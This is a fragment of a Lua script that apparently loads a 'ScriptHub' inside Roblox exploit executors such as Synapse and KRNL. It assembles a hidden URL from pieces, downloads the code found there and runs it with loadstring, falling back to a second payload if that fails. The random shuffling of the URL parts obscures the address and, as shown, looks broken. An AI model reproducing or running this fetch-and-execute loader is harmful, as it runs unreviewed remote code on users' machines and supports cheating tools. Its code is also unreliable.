local function _shuffleParts(src)
	local _order={1,2,3,4,5}
	for _i=#_order,2,-1 do
		local _j=_rnd(1,_i)
		_order[_i],_order[_j]=_order[_j],_order[_i]
	end
	local _dst={}
	for _i=1,#_order do _dst[_i]=src[_order[_i]]end
	return _dst
end

local function _buildHubUrl()
	return table.concat(_shuffleParts(_buildParts()))
end

local function _chooseLoader()
	local _tests={loadstring,load}
	local _ok1,_r1=_pcall(function()return syn and syn.loadfunc end)
	local _ok2,_r2=_pcall(function()return KRNL and KRNL.load end)
	if _ok1 and type(_r1)=="function"then _tests[#_tests+1]=_r1 end
	if _ok2 and type(_r2)=="function"then _tests[#_tests+1]=_r2 end
	for _,_f in ipairs(_tests)do
		if type(_f)=="function"then return _f end
	end
	return nil
end

local function _tryLoad(code)
	local _loader=_chooseLoader()
	if type(_loader)~="function"then return false,"missing loader"end
	local _ok,_a,_b=_pcall(_loader,code)
	if not _ok then return false,_T(_a)end
	if type(_a)=="function"then return true,_a end
	if type(_b)=="function"then return true,_b end
	return false,"loader returned invalid type"
end

local function _safeExec(fn)
	if type(fn)~="function"then return false,"bad function"end
	local _ok,_err=_pcall(fn)
	if not _ok then return false,_T(_err)end
	return true
end

local function _loadHub()
	_errNotify("Opening ScriptHub...")
	_taskspawn(function()
		local _ok,_err=_pcall(function()
			local _url=_buildHubUrl()
			local _content=_safeGet(_url)
			local _loader
			if _content and _content~=""then
				local _loaded,_maybeLoader=_tryLoad(_content)
				if _loaded then _loader=_maybeLoader end
			end
			if not _loader then
				local _fb=_fallbackHub()
				local _loaded,_maybeLoader=_tryLoad(_fb)
				if not _loaded then error("fallback loader failed: ".._T(_maybeLoader))end
				_loader=_maybeLoader
			end
			local _ran,_rerr=_safeExec(_loader)
			if not _ran then error(_rerr)end
		end)
		if not _ok then
			_errNotify("Hub load error: ".._T(_err))
		end
	end)
end

